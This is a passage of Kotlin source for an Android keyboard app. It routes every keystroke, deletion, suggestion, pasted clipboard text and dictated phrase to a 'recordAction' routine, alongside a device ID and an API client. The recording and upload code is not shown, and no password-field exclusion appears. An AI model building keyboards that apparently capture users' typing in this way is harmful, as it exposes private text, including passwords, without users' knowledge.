package com.keywordrecord.keyboard

import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.inputmethodservice.InputMethodService
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.speech.RecognitionListener
import android.speech.RecognizerIntent
import android.speech.SpeechRecognizer
import android.text.Editable
import android.text.InputType
import android.text.TextWatcher
import android.util.TypedValue
import android.view.Gravity
import android.view.HapticFeedbackConstants
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.inputmethod.EditorInfo
import android.widget.Button
import android.widget.EditText
import android.widget.GridLayout
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.PopupMenu
import android.widget.TextView
import android.widget.Toast
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import com.keywordrecord.keyboard.R
import java.util.Locale

class KeyboardIME : InputMethodService() {

    companion object {
        @Volatile
        var isInputActive: Boolean = false
    }

    private lateinit var apiClient: ApiClient
    private lateinit var suggestionProvider: DictionarySuggestionProvider
    private lateinit var deviceUniqueId: String
    private var isShiftOn = false
    private var forceAllCaps = false
    private val letterKeyLabels = mutableListOf<Pair<TextView, String>>()
    private var currentText = StringBuilder()
    private var currentMode = KeyboardMode.LETTERS
    private var selectedEmojiCategory = 0
    private var emojiSearchQuery = ""

    private lateinit var panelLetters: LinearLayout
    private lateinit var panelSymbols: LinearLayout
    private lateinit var panelEmoji: LinearLayout
    private lateinit var toolbarStrip: LinearLayout
    private lateinit var suggestionStrip: LinearLayout
    private lateinit var suggestionLeft: TextView
    private lateinit var suggestionCenter: TextView
    private lateinit var suggestionRight: TextView
    private lateinit var bottomRow: LinearLayout
    private lateinit var bottomRowEmoji: LinearLayout
    private lateinit var emojiGrid: GridLayout
    private lateinit var emojiCategoryBar: LinearLayout
    private lateinit var emojiSectionTitle: TextView
    private lateinit var emojiSearch: EditText
    private lateinit var modeSwitchBtn: Button
    private lateinit var emojiButton: ImageButton
    private lateinit var emojiTabButton: ImageButton
    private lateinit var shiftButton: ImageButton
    private lateinit var enterButton: ImageButton
    private var keyboardRoot: View? = null
    private var symbolPage = 1
    private var isRepeatingDelete = false
    private var deleteRepeatCount = 0
    private val deleteHandler = Handler(Looper.getMainLooper())
    private val uiHandler = Handler(Looper.getMainLooper())
    private val suggestionUpdateRunnable = Runnable { updateSuggestionsNow() }
    private var pendingRecordKey: String? = null
    private var pendingRecordAction: String? = null
    private val recordFlushRunnable = Runnable { flushPendingRecord() }
    private var speechRecognizer: SpeechRecognizer? = null
    private var isListeningVoice = false

    private val deleteRepeatRunnable = object : Runnable {
        override fun run() {
            if (!isRepeatingDelete) return
            if (!handleDelete()) {
                stopRepeatDelete()
                return
            }
            deleteRepeatCount++
            val delay = when {
                deleteRepeatCount < 8 -> 120L
                deleteRepeatCount < 25 -> 60L
                else -> 30L
            }
            deleteHandler.postDelayed(this, delay)
        }
    }

    private val letterRows = listOf(
        listOf("Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"),
        listOf("A", "S", "D", "F", "G", "H", "J", "K", "L"),
        listOf("Z", "X", "C", "V", "B", "N", "M")
    )

    private val numberHints = listOf("1", "2", "3", "4", "5", "6", "7", "8", "9", "0")

    private val symbolRowsPage1 = listOf(
        listOf("1", "2", "3", "4", "5", "6", "7", "8", "9", "0"),
        listOf("-", "/", ":", ";", "(", ")", "$", "&", "@", "\""),
        listOf(".", ",", "?", "!", "'")
    )

    private val symbolRowsPage2 = listOf(
        listOf("[", "]", "{", "}", "#", "%", "^", "*", "+", "="),
        listOf("_", "\\", "|", "~", "<", ">", "€", "£", "¥", "•"),
        listOf(".", ",", "?", "!", "'")
    )

    private enum class KeyboardMode {
        LETTERS, SYMBOLS, EMOJI
    }

    private enum class KeyStyle {
        LETTER, FUNCTION, ENTER
    }

    override fun onCreate() {
        super.onCreate()
        apiClient = ApiClient(this)
        suggestionProvider = DictionarySuggestionProvider(this)
        suggestionProvider.initialize()
        deviceUniqueId = DeviceIdManager.getDeviceUniqueId(this)
        setupSpeechRecognizer()
    }

    private fun setupSpeechRecognizer() {
        if (!SpeechRecognizer.isRecognitionAvailable(this)) return
        speechRecognizer = SpeechRecognizer.createSpeechRecognizer(this)
        speechRecognizer?.setRecognitionListener(object : RecognitionListener {
            override fun onReadyForSpeech(params: Bundle?) {}
            override fun onBeginningOfSpeech() {}
            override fun onRmsChanged(rmsdB: Float) {}
            override fun onBufferReceived(buffer: ByteArray?) {}
            override fun onEndOfSpeech() { isListeningVoice = false }
            override fun onError(error: Int) { isListeningVoice = false }
            override fun onResults(results: Bundle?) {
                isListeningVoice = false
                val matches = results?.getStringArrayList(SpeechRecognizer.RESULTS_RECOGNITION)
                val text = matches?.firstOrNull()?.trim().orEmpty()
                if (text.isNotEmpty()) {
                    val formatted = if (isShiftOn) capitalizeWord(text) else text.lowercase(Locale.getDefault())
                    currentConnection?.commitText("$formatted ", 1)
                    currentText.append("$formatted ")
                    recordAction(formatted.take(30), "voice")
                    scheduleUpdateSuggestions()
                }
            }
            override fun onPartialResults(partialResults: Bundle?) {}
            override fun onEvent(eventType: Int, params: Bundle?) {}
        })
    }

    override fun onDestroy() {
        speechRecognizer?.destroy()
        speechRecognizer = null
        super.onDestroy()
    }

    override fun onCreateInputView(): View {
        val view = LayoutInflater.from(this).inflate(R.layout.keyboard_view, null)
        keyboardRoot = view
        setupKeyboard(view)
        setupWindowInsets(view)
        return view
    }

    private fun setupWindowInsets(root: View) {
        ViewCompat.setOnApplyWindowInsetsListener(root) { view, insets ->
            val navBarInsets = insets.getInsets(WindowInsetsCompat.Type.navigationBars()).bottom
            val spacer = view.findViewById<View>(R.id.system_nav_spacer)
            val baseSpacer = resources.getDimensionPixelSize(R.dimen.system_nav_spacer_height)
            val params = spacer.layoutParams
            params.height = baseSpacer + navBarInsets
            spacer.layoutParams = params
            insets
        }
        ViewCompat.requestApplyInsets(root)
    }

    private fun setupKeyboard(root: View) {
        panelLetters = root.findViewById(R.id.panel_letters)
        panelSymbols = root.findViewById(R.id.panel_symbols)
        panelEmoji = root.findViewById(R.id.panel_emoji)
        toolbarStrip = root.findViewById(R.id.toolbar_strip)
        suggestionStrip = root.findViewById(R.id.suggestion_strip)
        suggestionLeft = root.findViewById(R.id.suggestion_left)
        suggestionCenter = root.findViewById(R.id.suggestion_center)
        suggestionRight = root.findViewById(R.id.suggestion_right)
        bottomRow = root.findViewById(R.id.bottom_row)
        bottomRowEmoji = root.findViewById(R.id.bottom_row_emoji)
        emojiGrid = root.findViewById(R.id.emoji_grid)
        emojiCategoryBar = root.findViewById(R.id.emoji_category_bar)
        emojiSectionTitle = root.findViewById(R.id.emoji_section_title)
        emojiSearch = root.findViewById(R.id.emoji_search)
        modeSwitchBtn = root.findViewById(R.id.btn_mode_switch)
        emojiButton = root.findViewById(R.id.btn_emoji)
        emojiTabButton = root.findViewById(R.id.btn_emoji_tab)

        setupLetterPanel(root)
        setupSymbolPanel(root)
        setupEmojiLibrary()
        setupBottomRow(root)
        setupToolbar(root)
        setupSuggestions()
        switchMode(KeyboardMode.LETTERS)
    }

    private fun setupLetterPanel(root: View) {
        val row1 = root.findViewById<LinearLayout>(R.id.row_1)
        val row2 = root.findViewById<LinearLayout>(R.id.row_2)
        val row3 = root.findViewById<LinearLayout>(R.id.row_3)
        listOf(row1, row2, row3).forEach { row ->
            row.clipChildren = true
            row.clipToPadding = true
        }

        letterRows[0].forEachIndexed { index, key ->
            row1.addView(createLetterKey(key, numberHints[index]))
        }

        letterRows[1].forEach { key ->
            row2.addView(createLetterKey(key))
        }

        shiftButton = createIconKey(R.drawable.ic_shift, KeyStyle.FUNCTION, 1.3f)
        shiftButton.setOnClickListener { toggleShift() }
        row3.addView(shiftButton)

        letterRows[2].forEach { key ->
            row3.addView(createLetterKey(key))
        }

        val deleteButton = createIconKey(R.drawable.ic_backspace, KeyStyle.FUNCTION, 1.3f)
        setupRepeatDelete(deleteButton)
        row3.addView(deleteButton)
    }

    private fun setupSymbolPanel(root: View) {
        rebuildSymbolPanel(root)
    }

    private fun rebuildSymbolPanel(root: View) {
        val row1 = root.findViewById<LinearLayout>(R.id.symbol_row_1)
        val row2 = root.findViewById<LinearLayout>(R.id.symbol_row_2)
        val row3 = root.findViewById<LinearLayout>(R.id.symbol_row_3)
        row1.removeAllViews()
        row2.removeAllViews()
        row3.removeAllViews()

        val rows = if (symbolPage == 1) symbolRowsPage1 else symbolRowsPage2

        rows[0].forEach { symbol ->
            row1.addView(createKeyButton(symbol, "symbol", KeyStyle.LETTER))
        }
        rows[1].forEach { symbol ->
            row2.addView(createKeyButton(symbol, "symbol", KeyStyle.LETTER))
        }

        val hashButton = createKeyButton(
            if (symbolPage == 1) "#+=" else "123",
            "symbol",
            KeyStyle.FUNCTION,
            1.35f
        )
        hashButton.setOnClickListener {
            symbolPage = if (symbolPage == 1) 2 else 1
            keyboardRoot?.let { rebuildSymbolPanel(it) }
        }
        row3.addView(hashButton)

        rows[2].forEach { symbol ->
            row3.addView(createKeyButton(symbol, "symbol", KeyStyle.LETTER, 0.95f))
        }

        val deleteButton = createIconKey(R.drawable.ic_backspace, KeyStyle.FUNCTION, 1.35f)
        setupRepeatDelete(deleteButton)
        row3.addView(deleteButton)
    }

    private fun setupEmojiLibrary() {
        emojiCategoryBar.removeAllViews()
        val tabSize = resources.getDimensionPixelSize(R.dimen.emoji_category_size)

        EmojiRepository.categories.forEachIndexed { index, category ->
            val tab = TextView(this)
            tab.text = category.icon
            tab.gravity = Gravity.CENTER
            tab.setTextSize(TypedValue.COMPLEX_UNIT_SP, 18f)
            tab.layoutParams = LinearLayout.LayoutParams(tabSize, tabSize).apply {
                setMargins(4, 0, 4, 0)
            }
            tab.setOnClickListener {
                selectedEmojiCategory = index
                emojiSearchQuery = ""
                emojiSearch.setText("")
                renderEmojiGrid()
                updateEmojiCategorySelection()
            }
            emojiCategoryBar.addView(tab)
        }

        emojiSearch.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
            override fun afterTextChanged(s: Editable?) {
                emojiSearchQuery = s?.toString()?.trim() ?: ""
                renderEmojiGrid()
            }
        })

        emojiSearch.setOnFocusChangeListener { _, hasFocus ->
            if (hasFocus) {
                currentInputConnection?.finishComposingText()
            }
        }

        panelEmoji.findViewById<ImageButton>(R.id.btn_emoji_back).setOnClickListener {
            switchMode(KeyboardMode.LETTERS)
        }

        renderEmojiGrid()
        updateEmojiCategorySelection()
    }

    private fun renderEmojiGrid() {
        emojiGrid.removeAllViews()
        val cellSize = resources.getDimensionPixelSize(R.dimen.emoji_cell_size)
        val spec = GridLayout.spec(GridLayout.UNDEFINED, 1f)

        val emojis: List<String>
        val title: String

        if (emojiSearchQuery.isNotEmpty()) {
            emojis = EmojiRepository.categories
                .flatMap { it.emojis }
                .distinct()
                .filter { matchesEmojiSearch(it, emojiSearchQuery) }
            title = getString(R.string.emoji_search_hint)
        } else {
            val category = EmojiRepository.categories[selectedEmojiCategory]
            emojis = category.emojis
            title = category.title
        }

        emojiSectionTitle.text = title
        emojiSectionTitle.visibility = if (title.isEmpty()) View.GONE else View.VISIBLE

        emojis.forEach { emoji ->
            val button = Button(this, null, android.R.attr.borderlessButtonStyle)
            button.text = emoji
            button.setTextSize(TypedValue.COMPLEX_UNIT_SP, 22f)
            button.setTextColor(getColor(R.color.key_text))
            button.setBackgroundResource(R.drawable.key_background_selector)
            button.isAllCaps = false
            button.stateListAnimator = null
            button.elevation = 0f
            button.setPadding(0, 0, 0, 0)
            button.layoutParams = GridLayout.LayoutParams(spec, spec).apply {
                width = cellSize
                height = cellSize
                setMargins(2, 2, 2, 2)
            }
            button.setOnClickListener { tappedView ->
                performKeyTapHaptic(tappedView)
                handleCharacter(emoji, "emoji")
            }
            emojiGrid.addView(button)
        }
    }

    private fun matchesEmojiSearch(emoji: String, query: String): Boolean {
        val lowerQuery = query.lowercase()
        return emoji.contains(lowerQuery, ignoreCase = true) ||
            emoji.codePoints().anyMatch { Character.getName(it)?.lowercase()?.contains(lowerQuery) == true }
    }

    private fun updateEmojiCategorySelection() {
        for (i in 0 until emojiCategoryBar.childCount) {
            val tab = emojiCategoryBar.getChildAt(i)
            if (i == selectedEmojiCategory && emojiSearchQuery.isEmpty()) {
                tab.setBackgroundResource(R.drawable.emoji_category_active)
            } else {
                tab.background = null
            }
        }
    }

    private fun setupBottomRow(root: View) {
        modeSwitchBtn.setOnClickListener { tappedView ->
            performKeyTapHaptic(tappedView)
            when (currentMode) {
                KeyboardMode.LETTERS -> switchMode(KeyboardMode.SYMBOLS)
                KeyboardMode.SYMBOLS, KeyboardMode.EMOJI -> switchMode(KeyboardMode.LETTERS)
            }
        }

        emojiButton.setOnClickListener { tappedView ->
            performKeyTapHaptic(tappedView)
            openEmojiLibrary()
        }

        root.findViewById<Button>(R.id.btn_comma).setOnClickListener { tappedView ->
            performKeyTapHaptic(tappedView)
            handleCharacter(",", "symbol")
        }

        root.findViewById<Button>(R.id.btn_space).setOnClickListener { tappedView ->
            performKeyTapHaptic(tappedView)
            handleSpace()
        }

        root.findViewById<Button>(R.id.btn_period).setOnClickListener { tappedView ->
            performKeyTapHaptic(tappedView)
            handleCharacter(".", "symbol")
        }

        root.findViewById<ImageButton>(R.id.btn_enter).also { enterButton = it }.setOnClickListener { tappedView ->
            performKeyTapHaptic(tappedView)
            handleEnter()
        }

        root.findViewById<Button>(R.id.btn_emoji_abc).setOnClickListener { tappedView ->
            performKeyTapHaptic(tappedView)
            switchMode(KeyboardMode.LETTERS)
        }

        root.findViewById<ImageButton>(R.id.btn_emoji_delete).let { setupRepeatDelete(it) }
    }

    private fun setupRepeatDelete(button: View) {
        button.setOnTouchListener { view, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    view.isPressed = true
                    startRepeatDelete()
                    true
                }
                MotionEvent.ACTION_UP, MotionEvent.ACTION_CANCEL -> {
                    view.isPressed = false
                    stopRepeatDelete()
                    true
                }
                else -> false
            }
        }
    }

    private fun startRepeatDelete() {
        isRepeatingDelete = true
        deleteRepeatCount = 0
        handleDelete()
        deleteHandler.postDelayed(deleteRepeatRunnable, 350L)
    }

    private fun stopRepeatDelete() {
        isRepeatingDelete = false
        deleteHandler.removeCallbacks(deleteRepeatRunnable)
    }

    private fun setupSuggestions() {
        listOf(suggestionLeft, suggestionCenter, suggestionRight).forEach { view ->
            view.setOnClickListener { tappedView ->
                val word = view.text?.toString()?.trim().orEmpty()
                if (word.isNotEmpty()) {
                    performKeyTapHaptic(tappedView)
                    applySuggestion(word)
                }
            }
        }
    }

    private fun performKeyTapHaptic(source: View? = keyboardRoot) {
        val view = source ?: keyboardRoot ?: return
        val feedback = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            HapticFeedbackConstants.KEYBOARD_TAP
        } else {
            @Suppress("DEPRECATION")
            HapticFeedbackConstants.VIRTUAL_KEY
        }
        view.performHapticFeedback(feedback)
    }

    private fun getCurrentComposingSegment(): String {
        val before = currentConnection?.getTextBeforeCursor(100, 0)?.toString() ?: return ""
        if (before.isEmpty()) return ""
        val segment = StringBuilder()
        for (i in before.length - 1 downTo 0) {
            val char = before[i]
            if (char.isLetter() || char == ' ') {
                segment.insert(0, char)
            } else {
                break
            }
        }
        return segment.toString()
    }

    private fun getCurrentWordPrefix(): String {
        val segment = getCurrentComposingSegment()
        if (segment.isEmpty() || !segment.last().isLetter()) return ""
        return segment.takeLastWhile { it.isLetter() }
    }

    private fun getPreviousWord(): String {
        return suggestionProvider.parseComposing(getCurrentComposingSegment()).previousWord
    }

    private fun isKeyboardReady(): Boolean = ::suggestionStrip.isInitialized

    private fun scheduleUpdateSuggestions() {
        if (!isKeyboardReady()) return
        uiHandler.removeCallbacks(suggestionUpdateRunnable)
        uiHandler.postDelayed(suggestionUpdateRunnable, 35)
    }

    private fun updateSuggestionsNow() {
        if (!isKeyboardReady()) return

        if (currentMode != KeyboardMode.LETTERS) {
            toolbarStrip.visibility = View.VISIBLE
            suggestionStrip.visibility = View.GONE
            clearSuggestionViews()
            return
        }

        val context = suggestionProvider.parseComposing(getCurrentComposingSegment())
        val isTyping = context.segment.isNotEmpty()

        if (!isTyping) {
            toolbarStrip.visibility = View.VISIBLE
            suggestionStrip.visibility = View.GONE
            clearSuggestionViews()
            return
        }

        toolbarStrip.visibility = View.GONE
        suggestionStrip.visibility = View.VISIBLE

        if (!suggestionProvider.isInitialized()) {
            uiHandler.postDelayed(suggestionUpdateRunnable, 150)
            clearSuggestionViews()
            return
        }

        val suggestions = suggestionProvider.getSuggestions(context, 5)

        if (suggestions.isEmpty()) {
            clearSuggestionViews()
            return
        }
        when (suggestions.size) {
            1 -> {
                bindSuggestion(suggestionLeft, null)
                bindSuggestion(suggestionCenter, suggestions[0])
                bindSuggestion(suggestionRight, null)
            }
            2 -> {
                bindSuggestion(suggestionLeft, suggestions[0])
                bindSuggestion(suggestionCenter, suggestions[1])
                bindSuggestion(suggestionRight, null)
            }
            else -> {
                bindSuggestion(suggestionLeft, suggestions[1])
                bindSuggestion(suggestionCenter, suggestions[0])
                bindSuggestion(suggestionRight, suggestions[2])
            }
        }
    }

    private fun bindSuggestion(view: TextView, text: String?) {
        if (text.isNullOrEmpty()) {
            view.text = ""
            view.visibility = View.INVISIBLE
            view.isClickable = false
        } else {
            view.text = formatSuggestionForInsert(text)
            view.visibility = View.VISIBLE
            view.isClickable = true
        }
    }

    private fun formatLetterOutput(letter: String): String {
        val base = if (isShiftOn) letter.uppercase() else letter.lowercase()
        if (forceAllCaps) return base.uppercase(Locale.getDefault())
        return base
    }

    private fun readInputAttributes(attribute: EditorInfo?) {
        forceAllCaps = false
        val inputType = attribute?.inputType ?: return
        if (inputType and InputType.TYPE_TEXT_FLAG_CAP_CHARACTERS != 0) {
            forceAllCaps = true
        }
    }

    private fun capitalizeWord(word: String): String {
        if (word.isEmpty()) return word
        return word.replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.getDefault()) else it.toString() }
    }

    private fun formatSuggestionForInsert(text: String): String {
        if (forceAllCaps) return text.uppercase(Locale.getDefault())
        if (isShiftOn) {
            return if (text.contains(' ')) {
                text.split(" ").joinToString(" ") { capitalizeWord(it.lowercase(Locale.getDefault())) }
            } else {
                capitalizeWord(text.lowercase(Locale.getDefault()))
            }
        }
        return text.lowercase(Locale.getDefault())
    }

    private fun clearSuggestionViews() {
        if (!isKeyboardReady()) return
        listOf(suggestionLeft, suggestionCenter, suggestionRight).forEach { view ->
            view.text = ""
            view.visibility = View.GONE
        }
    }

    private fun applySuggestion(suggestion: String) {
        val connection = currentConnection ?: return
        val segment = getCurrentComposingSegment()
        val wordPrefix = getCurrentWordPrefix()
        val isPhraseSuggestion = suggestion.contains(' ')

        val deleteLength = when {
            isPhraseSuggestion -> segment.trimEnd().length
            else -> wordPrefix.length
        }

        if (deleteLength > 0) {
            connection.deleteSurroundingText(deleteLength, 0)
            repeat(deleteLength.coerceAtMost(currentText.length)) {
                if (currentText.isNotEmpty()) {
                    currentText.deleteCharAt(currentText.length - 1)
                }
            }
        }

        val output = formatSuggestionForInsert(suggestion)
        val textToInsert = "$output "
        connection.commitText(textToInsert, 1)
        currentText.append(textToInsert)
        recordAction(output, "suggestion")
        scheduleUpdateSuggestions()
    }

    private fun setupToolbar(root: View) {
        root.findViewById<ImageButton>(R.id.btn_toolbar_grid).setOnClickListener { button ->
            showToolbarMenu(button)
        }

        root.findViewById<ImageButton>(R.id.btn_toolbar_clipboard).setOnClickListener {
            pasteFromClipboard()
        }

        root.findViewById<ImageButton>(R.id.btn_toolbar_translate).setOnClickListener {
            openTranslate()
        }

        root.findViewById<ImageButton>(R.id.btn_toolbar_palette).setOnClickListener {
            openEmojiLibrary()
        }

        root.findViewById<ImageButton>(R.id.btn_toolbar_mic).setOnClickListener {
            startVoiceInput()
        }
    }

    private fun showToolbarMenu(anchor: View) {
        val menu = PopupMenu(this, anchor)
        menu.menu.add(0, 2, 0, getString(R.string.toolbar_menu_hide))
        menu.setOnMenuItemClickListener { item ->
            when (item.itemId) {
                2 -> {
                    requestHideSelf(0)
                    true
                }
                else -> false
            }
        }
        menu.show()
    }

    private fun pasteFromClipboard() {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = clipboard.primaryClip
        val text = clip?.takeIf { it.itemCount > 0 }?.getItemAt(0)?.coerceToText(this)?.toString()?.trim()
        if (text.isNullOrEmpty()) {
            Toast.makeText(this, getString(R.string.clipboard_empty), Toast.LENGTH_SHORT).show()
            return
        }
        currentConnection?.commitText(text, 1)
        currentText.append(text)
        recordAction(text.take(20), "paste")
        Toast.makeText(this, getString(R.string.clipboard_pasted), Toast.LENGTH_SHORT).show()
        scheduleUpdateSuggestions()
    }

    private fun openTranslate() {
        val query = getCurrentWordPrefix().ifEmpty { getPreviousWord() }.ifEmpty { "hello" }
        val uri = Uri.parse(
            "https://translate.google.com/?sl=auto&tl=hi&text=${Uri.encode(query)}"
        )
        try {
            startActivity(Intent(Intent.ACTION_VIEW, uri).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
        } catch (_: Exception) {
            Toast.makeText(this, getString(R.string.translate_opening), Toast.LENGTH_SHORT).show()
        }
    }

    private fun startVoiceInput() {
        val recognizer = speechRecognizer
        if (recognizer == null || isListeningVoice) {
            Toast.makeText(this, getString(R.string.voice_not_available), Toast.LENGTH_SHORT).show()
            return
        }
        val intent = Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH).apply {
            putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL, RecognizerIntent.LANGUAGE_MODEL_FREE_FORM)
            putExtra(RecognizerIntent.EXTRA_LANGUAGE, Locale.getDefault())
            putExtra(RecognizerIntent.EXTRA_PARTIAL_RESULTS, true)
        }
        isListeningVoice = true
        recognizer.startListening(intent)
        Toast.makeText(this, getString(R.string.voice_listening), Toast.LENGTH_SHORT).show()
    }

    override fun onComputeInsets(outInsets: InputMethodService.Insets) {
        super.onComputeInsets(outInsets)
        val root = keyboardRoot ?: return
        if (root.width == 0 || root.height == 0) return
    }

    private fun openEmojiLibrary() {
        switchMode(KeyboardMode.EMOJI)
    }

    private fun switchMode(mode: KeyboardMode) {
        currentMode = mode
        panelLetters.visibility = if (mode == KeyboardMode.LETTERS) View.VISIBLE else View.GONE
        panelSymbols.visibility = if (mode == KeyboardMode.SYMBOLS) View.VISIBLE else View.GONE
        panelEmoji.visibility = if (mode == KeyboardMode.EMOJI) View.VISIBLE else View.GONE
        toolbarStrip.visibility = if (mode == KeyboardMode.EMOJI) View.GONE else View.VISIBLE
        if (isKeyboardReady()) {
            suggestionStrip.visibility = View.GONE
        }
        bottomRow.visibility = if (mode == KeyboardMode.EMOJI) View.GONE else View.VISIBLE
        bottomRowEmoji.visibility = if (mode == KeyboardMode.EMOJI) View.VISIBLE else View.GONE

        if (mode == KeyboardMode.LETTERS) {
            symbolPage = 1
            emojiSearchQuery = ""
            emojiSearch.setText("")
        }

        if (mode == KeyboardMode.EMOJI) {
            renderEmojiGrid()
            updateEmojiCategorySelection()
            emojiTabButton.setBackgroundResource(R.drawable.key_shift_active_shape)
        } else {
            emojiTabButton.setBackgroundResource(R.drawable.key_function_selector)
        }

        modeSwitchBtn.text = when (mode) {
            KeyboardMode.LETTERS -> getString(R.string.key_symbols)
            KeyboardMode.SYMBOLS, KeyboardMode.EMOJI -> getString(R.string.key_abc)
        }

        emojiButton.setBackgroundResource(
            if (mode == KeyboardMode.EMOJI) R.drawable.key_shift_active_shape else R.drawable.key_function_selector
        )

        if (mode == KeyboardMode.LETTERS) {
            scheduleUpdateSuggestions()
        } else {
            clearSuggestionViews()
        }
    }

    private fun toggleShift() {
        performKeyTapHaptic(shiftButton)
        isShiftOn = !isShiftOn
        shiftButton.setBackgroundResource(
            if (isShiftOn) R.drawable.key_shift_active_shape else R.drawable.key_function_selector
        )
        refreshLetterKeyLabels()
    }

    private fun refreshLetterKeyLabels() {
        letterKeyLabels.forEach { (view, letter) ->
            view.text = if (isShiftOn) letter.uppercase() else letter.lowercase()
        }
    }

    private fun createLetterKey(letter: String, numberHint: String? = null): View {
        val keyView = LayoutInflater.from(this).inflate(R.layout.key_letter, null, false)
        val letterView = keyView.findViewById<TextView>(R.id.key_letter)
        val hintView = keyView.findViewById<TextView>(R.id.key_hint)

        letterKeyLabels.add(letterView to letter)
        letterView.text = if (isShiftOn) letter.uppercase() else letter.lowercase()
        if (numberHint != null) {
            hintView.text = numberHint
            hintView.visibility = View.VISIBLE
            letterView.setPadding(0, resources.getDimensionPixelSize(R.dimen.key_margin_v), 0, 0)
        }

        keyView.layoutParams = createLayoutParams(1f)
        keyView.setOnClickListener { tappedView ->
            performKeyTapHaptic(tappedView)
            handleCharacter(formatLetterOutput(letter), "key")
        }
        return keyView
    }

    private fun createIconKey(iconRes: Int, style: KeyStyle, weight: Float): ImageButton {
        val button = ImageButton(this, null, android.R.attr.borderlessButtonStyle)
        applyIconKeyStyle(button, style)
        button.setImageResource(iconRes)
        button.layoutParams = createLayoutParams(weight)
        return button
    }

    private fun createKeyButton(
        label: String,
        action: String,
        style: KeyStyle,
        weight: Float = 1f
    ): Button {
        val button = Button(this, null, android.R.attr.borderlessButtonStyle)
        applyKeyStyle(button, style)
        button.text = if (style == KeyStyle.LETTER && label.length == 1 && label[0].isLetter()) {
            label.lowercase()
        } else {
            label
        }
        button.gravity = Gravity.CENTER
        button.layoutParams = createLayoutParams(weight)
        button.setOnClickListener { tappedView ->
            performKeyTapHaptic(tappedView)
            val output = if (style == KeyStyle.LETTER && label.length == 1 && label[0].isLetter()) {
                if (isShiftOn) label.uppercase() else label.lowercase()
            } else {
                label
            }
            handleCharacter(output, action)
        }
        return button
    }

    private fun applyKeyStyle(button: Button, style: KeyStyle) {
        when (style) {
            KeyStyle.LETTER -> {
                button.setBackgroundResource(R.drawable.key_background_selector)
                button.setTextColor(getColor(R.color.key_text))
                button.setTextSize(TypedValue.COMPLEX_UNIT_PX, resources.getDimension(R.dimen.key_text_size))
            }
            KeyStyle.FUNCTION -> {
                button.setBackgroundResource(R.drawable.key_function_selector)
                button.setTextColor(getColor(R.color.key_text_secondary))
                button.setTextSize(TypedValue.COMPLEX_UNIT_PX, resources.getDimension(R.dimen.key_function_text_size))
            }
            KeyStyle.ENTER -> {
                button.setBackgroundResource(R.drawable.key_enter_selector)
                button.setTextColor(getColor(R.color.key_text))
                button.setTextSize(TypedValue.COMPLEX_UNIT_PX, resources.getDimension(R.dimen.key_function_text_size))
            }
        }
        button.isAllCaps = false
        button.stateListAnimator = null
        button.elevation = 0f
    }

    private fun applyIconKeyStyle(button: ImageButton, style: KeyStyle) {
        when (style) {
            KeyStyle.FUNCTION -> button.setBackgroundResource(R.drawable.key_function_selector)
            KeyStyle.ENTER -> button.setBackgroundResource(R.drawable.key_enter_selector)
            KeyStyle.LETTER -> button.setBackgroundResource(R.drawable.key_background_selector)
        }
        button.scaleType = ImageView.ScaleType.FIT_CENTER
        button.stateListAnimator = null
        button.elevation = 0f
        val padding = resources.getDimensionPixelSize(R.dimen.key_icon_padding)
        button.setPadding(padding, padding, padding, padding)
    }

    private fun updateEnterKeyIcon() {
        if (!::enterButton.isInitialized) return

        val editorInfo = currentInputEditorInfo ?: return
        val actionId = editorInfo.imeOptions and EditorInfo.IME_MASK_ACTION
        val variation = editorInfo.inputType and EditorInfo.TYPE_MASK_VARIATION
        val isSearchField = actionId == EditorInfo.IME_ACTION_SEARCH ||
            variation == InputType.TYPE_TEXT_VARIATION_URI

        val iconRes = when {
            isSearchField -> R.drawable.ic_search
            actionId == EditorInfo.IME_ACTION_DONE -> R.drawable.ic_enter_done
            else -> R.drawable.ic_enter_return
        }
        enterButton.setImageResource(iconRes)
        enterButton.setBackgroundResource(
            if (isSearchField) R.drawable.key_enter_circle_selector
            else R.drawable.key_enter_selector
        )
    }

    private fun createLayoutParams(weight: Float): LinearLayout.LayoutParams {
        val marginH = resources.getDimensionPixelSize(R.dimen.key_margin_h)
        val marginV = resources.getDimensionPixelSize(R.dimen.key_margin_v)
        val keyHeight = resources.getDimensionPixelSize(R.dimen.key_height)
        return LinearLayout.LayoutParams(0, keyHeight, weight).apply {
            setMargins(marginH, marginV, marginH, marginV)
        }
    }

    private fun handleCharacter(char: String, action: String) {
        currentConnection?.commitText(char, 1)
        currentText.append(char)
        recordAction(char, action)
        if (currentMode == KeyboardMode.LETTERS && action == "key") {
            scheduleUpdateSuggestions()
        } else if (currentMode == KeyboardMode.LETTERS && isKeyboardReady()) {
            scheduleUpdateSuggestions()
        }
    }

    private fun handleSpace() {
        currentConnection?.commitText(" ", 1)
        currentText.append(" ")
        recordAction(" ", "space")
        if (currentMode == KeyboardMode.LETTERS) {
            scheduleUpdateSuggestions()
        }
    }

    private fun handleDelete(): Boolean {
        val connection = currentConnection ?: return false
        val selected = connection.getSelectedText(0)
        if (selected != null && selected.isNotEmpty()) {
            performKeyTapHaptic()
            connection.commitText("", 1)
            recordAction("⌫", "delete")
            return true
        }

        val before = connection.getTextBeforeCursor(1, 0)
        if (before == null || before.isEmpty()) {
            return false
        }

        connection.deleteSurroundingText(1, 0)
        if (currentText.isNotEmpty()) {
            currentText.deleteCharAt(currentText.length - 1)
        }
        performKeyTapHaptic()
        recordAction("⌫", "delete")
        if (currentMode == KeyboardMode.LETTERS) {
            scheduleUpdateSuggestions()
        }
        return true
    }

    private fun handleEnter() {
        val connection = currentConnection ?: return
